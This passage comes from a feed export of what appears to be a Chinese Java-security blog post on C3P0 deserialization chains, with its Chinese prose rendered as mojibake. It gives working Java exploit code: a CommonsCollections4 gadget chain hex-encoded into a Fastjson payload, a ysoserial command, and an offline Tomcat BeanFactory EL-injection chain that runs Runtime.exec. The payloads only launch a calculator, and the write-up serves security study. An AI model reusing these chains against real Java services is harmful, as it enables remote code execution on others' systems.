class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.StringWriter;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0Hex_CC4</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> PriorityQueue <span class="title function_">CC4</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesclass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="comment">//nameå­—æ®µ</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesclass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;Atkx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//æ¶æ„bytecodeå­—æ®µ</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodeFiled</span> <span class="operator">=</span> templatesclass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodeFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;H://Code/JavaSecurityCode/cc3/target/classes/calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodeFiled.set(templates,codes);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//å·¥å‚ç±»å­—æ®µ</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesclass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>() &#123;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//è°ƒç”¨transformerä»»æ„æ–¹æ³•çš„æ¥å£,æ­¤å¤„é€šè¿‡InstantiateTransformerä»£æ›¿InvokerTransformer</span></span><br><span class="line">        <span class="type">InstantiateTransformer</span> <span class="variable">instantiateTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123; Templates.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates&#125;);</span><br><span class="line">        Transformer[]  transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>&lt;&gt;(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">return</span> priorityQueue;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">addHexAscii</span><span class="params">(<span class="type">byte</span> b, StringWriter sw)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ub</span> <span class="operator">=</span> b &amp; <span class="number">0xff</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h1</span> <span class="operator">=</span> ub / <span class="number">16</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">h2</span> <span class="operator">=</span> ub % <span class="number">16</span>;</span><br><span class="line">        sw.write(toHexDigit(h1));</span><br><span class="line">        sw.write(toHexDigit(h2));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">char</span> <span class="title function_">toHexDigit</span><span class="params">(<span class="type">int</span> h)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">char</span> out;</span><br><span class="line">        <span class="keyword">if</span> (h &lt;= <span class="number">9</span>) out = (<span class="type">char</span>) (h + <span class="number">0x30</span>);</span><br><span class="line">        <span class="keyword">else</span> out = (<span class="type">char</span>) (h + <span class="number">0x37</span>);</span><br><span class="line">        <span class="comment">//System.err.println(h + &quot;: &quot; + out);</span></span><br><span class="line">        <span class="keyword">return</span> out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å°†ç±»åºåˆ—åŒ–ä¸ºå­—èŠ‚æ•°ç»„</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] tobyteArray(Object o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bao);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å­—èŠ‚æ•°ç»„è½¬åå…­è¿›åˆ¶</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toHexAscii</span><span class="params">(<span class="type">byte</span>[] bytes)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> bytes.length;</span><br><span class="line">        <span class="type">StringWriter</span> <span class="variable">sw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringWriter</span>(len * <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; len; ++i)</span><br><span class="line">            addHexAscii(bytes[i], sw);</span><br><span class="line">        <span class="keyword">return</span> sw.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> toHexAscii(tobyteArray(CC4()));</span><br><span class="line">        System.out.println(hex);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//Fastjson&lt;1.2.47</span></span><br><span class="line"><span class="comment">//        String payload = &quot;&#123;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;1\&quot;:&#123;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;&#125;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;2\&quot;:&#123;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;+ hex + &quot;;\&quot;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;&#125;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;&#125;&quot;;</span></span><br><span class="line">        <span class="comment">//ä½ç‰ˆæœ¬åˆ©ç”¨</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span>+ hex + <span class="string">&quot;;\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221503169.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å½“ç„¶ä¹Ÿå¯ä»¥ä½¿ç”¨ CB é“¾æˆ–å…¶ä»–é“¾å­</p><p>ä¹Ÿå¯ä»¥é€šè¿‡åŠ è½½ååºåˆ—åŒ–å¯¹è±¡æ¥æ‰§è¡Œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar .\ysoserial-all.jar CommonsCollections6 <span class="string">&quot;open -a Calculator&quot;</span> &gt; calc.ser</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0_all</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;L:\\JavaSecurity\\ysoserial-0.0.6\\calc.ser&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] data = toByteArray(in);</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="type">String</span> <span class="variable">HexString</span> <span class="operator">=</span> bytesToHexString(data, data.length);</span><br><span class="line">        System.out.println(HexString);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] toByteArray(InputStream in) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">byte</span>[] classBytes;</span><br><span class="line">        classBytes = <span class="keyword">new</span> <span class="title class_">byte</span>[in.available()];</span><br><span class="line">        in.read(classBytes);</span><br><span class="line">        in.close();</span><br><span class="line">        <span class="keyword">return</span> classBytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">bytesToHexString</span><span class="params">(<span class="type">byte</span>[] bArray, <span class="type">int</span> length)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(length);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; ++i) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">sTemp</span> <span class="operator">=</span> Integer.toHexString(<span class="number">255</span> &amp; bArray[i]);</span><br><span class="line">            <span class="keyword">if</span> (sTemp.length() &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                sb.append(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            sb.append(sTemp.toUpperCase());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¾—åˆ°åå…­è¿›åˆ¶ï¼Œç›´æ¥å»æ‰§è¡Œå³å¯<br><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221503342.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="ä¸å‡ºç½‘åˆ©ç”¨"><a class="markdownIt-Anchor" href="#ä¸å‡ºç½‘åˆ©ç”¨">#</a> ä¸å‡ºç½‘åˆ©ç”¨</h2><p>å½“ç›®æ ‡æœºå™¨ä¸å‡ºç½‘ï¼Œä¸”æ²¡æœ‰ fastjson ç›¸å…³ä¾èµ–æ—¶ï¼ŒC3P0 è¯¥å¦‚ä½•åˆ©ç”¨ï¼Ÿ</p><p>ç¯å¢ƒ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">8.5</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.tomcat.embed&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;tomcat-embed-el&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">8.5</span><span class="number">.15</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>æ¼æ´ç‚¹ä½äº <code>org.apache.naming.factory.BeanFactory</code></p><p>åªæœ‰ä¸€ä¸ªæ–¹æ³• <code>getObjectInstance</code> <br> å›é¡¾ç¬¬ä¸€ä¸ªé“¾å­ URLï¼Œä¼šå‘ç°æœ€åè°ƒç”¨çš„å°±æ˜¯è¯¥æ–¹æ³•ï¼Œè€Œä¸å‡ºç½‘çš„åˆ©ç”¨æ–¹å¼å°±æ˜¯é€šè¿‡æœ¬åœ°ç±»çš„åŠ è½½æ¥è¿›è¡Œ EL è¡¨è¾¾å¼æ³¨å…¥</p><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221503699.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å°† URL é“¾å­æ‰§è¡Œçš„åœ°æ–¹æ”¹æˆ EL è¡¨è¾¾å¼å³å¯ï¼Œå…¶ä½™ä¸ç”¨å˜</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0_Local</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">C3P0</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">            <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, (String)<span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, (String)<span class="literal">null</span>);</span><br><span class="line">            resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;faster=eval&quot;</span>));</span><br><span class="line">            resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;faster&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>));</span><br><span class="line">            <span class="keyword">return</span> resourceRef;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayInputStream</span> <span class="variable">bain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">oin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bain))&#123;</span><br><span class="line">            oin.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(ConnectionPoolDataSource lp) <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">connectionPoolDataSourceField</span> <span class="operator">=</span> PoolBackedDataSourceBase.class.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>);</span><br><span class="line">        connectionPoolDataSourceField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        connectionPoolDataSourceField.set(poolBackedDataSourceBase,lp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>(<span class="type">ByteArrayOutputStream</span> <span class="variable">baout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">oout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baout))&#123;</span><br><span class="line">            oout.writeObject(poolBackedDataSourceBase);</span><br><span class="line">            <span class="keyword">return</span> baout.toByteArray();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        C3P01.<span class="type">C3P0</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">C3P01</span>.C3P0();</span><br><span class="line">        <span class="type">byte</span>[] bytes = serialize(exp);</span><br><span class="line">        unserialize(bytes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ki10Moc/img/main/img/202305221504152.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="æœ€å"><a class="markdownIt-Anchor" href="#æœ€å">#</a> æœ€å</h2><p>é“¾å­æ•´ä½“ä¸æ˜¯å¾ˆéš¾ï¼Œä½†æ˜¯æœ‰ç‚¹ç»•ï¼Œå°¤å…¶æ˜¯ JNDI éƒ¨åˆ†æœ‰çš„å¯¹è±¡ä¸ debug ä¸€ä¸‹å¾ˆéš¾æƒ³è±¡æ˜¯æ€ä¹ˆè”ç³»èµ·æ¥çš„ï¼Œæœ¬æ–‡ä¹Ÿæ˜¯åº”è¯¥å¾ˆæ—©å°±å†™å®Œäº†ï¼Œå¥ˆä½•æœ€è¿‘é˜³äº†ï¼Œä¹Ÿæ˜¯éš”ç¦»äº†ä¸€æ®µæ—¶é—´ä¼‘å…»äº†ä¸€æ®µï¼Œå¸Œæœ›èƒ½æŠŠåé¢çš„æ—¶é—´éƒ½åˆ©ç”¨èµ·æ¥å§</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#å‰è¨€&quot;&gt;#&lt;/a&gt; å‰è¨€&lt;/h1&gt;
&lt;p&gt;C3P0 æ˜¯ä¸€ä¸ªå¼€æºçš„ JDBC è¿æ¥æ± ï¼Œå®ƒå®ç°äº†æ•°æ®æºå’Œ JNDI ç»‘å®šï¼Œæ”¯æŒ JDBC3 è§„èŒƒå’Œ JDBC2 çš„æ ‡å‡†æ‰©å±•ã€‚ç›®å‰ä½¿ç”¨å®ƒçš„å¼€æº</summary>
      
    
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="https://ki10moc.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Javaå®‰å…¨" scheme="https://ki10moc.github.io/tags/Java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>SnakeYamlååºåˆ—åŒ–</title>
